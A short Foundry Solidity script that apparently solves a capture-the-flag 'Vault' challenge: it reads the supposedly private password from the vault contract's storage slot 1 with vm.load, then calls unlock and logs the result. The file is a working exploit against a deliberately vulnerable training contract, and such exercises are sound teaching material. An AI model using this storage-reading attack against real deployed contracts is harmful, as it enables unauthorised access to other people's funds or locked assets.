// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Vault} from "../src/Vault.sol";

contract VaultSolve is Script {
    Vault public vault = Vault(0x80C30D2FE8e45F588d70bc5D530939c7f1b22f94);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Vault locked : ", vault.locked());
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(password);
        vault.unlock(password);

        console.log("Vault locked : ", vault.locked());
        vm.stopBroadcast();
    }
}
